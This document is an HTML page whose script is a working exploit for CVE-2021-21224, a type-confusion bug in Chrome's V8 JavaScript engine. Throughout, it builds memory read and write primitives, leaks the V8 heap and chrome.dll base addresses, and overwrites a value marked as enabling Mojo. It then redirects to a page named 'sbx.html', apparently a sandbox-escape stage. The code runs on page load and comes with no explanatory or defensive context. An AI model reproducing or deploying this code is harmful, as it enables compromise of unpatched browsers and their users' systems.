<html><script>// CVE-2021-21224   https://crbug.com/1195777
bug=(a)=>{
  let y = -0; let x = 0; if (a) x = 1.1
  let w = Math.abs(1 + Math.max(x << y, (x ? 3 : -3) >>> y))
  let z = 0 - Math.sign(a ? 0 : w)
  let v = ''; try{v = new Array(z); v.pop()}catch(er){}
  return [v, [0.1, 0.1, 0.1], [0.2,0.2,0.2,0.2]]
}
for (i = 0; i < 0x25000; ++i) bug(true); let b = bug(false)
a1 = b[0];    console.log('a1.length is negative:', a1.length)
a2 = b[1];    console.log('a2.length is 3:', a2.length)
a1[16] = 123; console.log('a2.length is 123:', a2.length)
f = new Float64Array(1)
u = new BigUint64Array(f.buffer)
BigInt.prototype.i2f = function(){u[0] = this; return f[0]}
Number.prototype.f2i = function(){f[0] = this; return u[0]}
function addrof(k){a1[7] = k; return a2[0].f2i()}
a3 = [a2[3], 0.1, 0.1, 0.1]
b[2][0] = (addrof(a3) - 32n).i2f()
b_1_10 = b[1][10]
b[1][10] = b[1][15]
function read8(k){a3[1] = (k - 16n).i2f(); return b[2][0][0].f2i()}
function write8(k, v){a3[1] = (k - 16n).i2f(); b[2][0][0] = v.i2f()}
v8heap_ptr = (addrof([]) & 0xfffffffffff00000n) + 0x40023n
v8heap = (read8(v8heap_ptr) & 0xffff0000n) << 16n
window_ptr = v8heap + (addrof(window) & 0xffffffffn) + 15n
m = new ArrayBuffer(599)
d = new DataView(m)
write8(addrof(m) + 0x1cn, window_ptr)
chrome_dll = d.getUint32(0, true) + 2**32*d.getUint32(4, true) - 0x7573E88
write8(addrof(m) + 0x1cn, BigInt(chrome_dll) + 0x7627657n)//mojoenable
d.setUint32(0, 0x1111111111, true)

localStorage.setItem('chrome_dll', chrome_dll)
b[1][10] = b_1_10
b[0] = 0
a1 = 0
location = 'sbx.html'
</script>
